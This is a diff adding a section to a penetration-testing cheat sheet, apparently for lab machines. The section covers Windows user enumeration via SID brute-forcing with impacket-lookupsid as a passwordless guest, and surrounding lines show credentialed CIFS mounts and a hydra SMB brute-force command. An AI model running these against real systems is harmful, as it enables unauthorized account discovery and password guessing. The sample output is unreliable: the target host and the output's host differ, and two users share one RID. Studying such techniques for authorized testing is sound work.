@@ -395,6 +395,27 @@ mount -t cifs //10.0.0.1/share /mnt/share
 mount -t cifs -o "username=user,password=password" //10.0.0.1/share /mnt/share
 ```
 
+#### User enumeration using SID
+
+Lookupsid is a tool that allows you to enumerate user and group Security Identifiers (SIDs) on a Windows system. Each user and group account in Windows has a unique SID, and by obtaining these SIDs, you can gather valuable information about the system's user accounts, aiding in understanding the network's structure and potential security risks. The tool uses the SMB (Server Message Block) protocol, which is commonly used for Windows networking, to facilitate communication.
+
+```
+#Command : python lookupsid.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+impacket-lookupsid 'mywindows.htb/guest'@mywindows.htb -no-pass
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Brute forcing SIDs at cicada.htb
+[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
+498: MYWINDOWS\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: MYWINDOWS\Administrator (SidTypeUser)
+501: MYWINDOWS\Guest (SidTypeUser)
+...
+1109: MYWINDOWS\Dev Support (SidTypeGroup)
+1601: MYWINDOWS\Totoro (SidTypeUser)
+1601: MYWINDOWS\Kiosec (SidTypeUser)
+```
+
 #### Bruteforce
 ```
 hydra -L users.txt -P passs.txt smb://10.0.0.1 -t 4
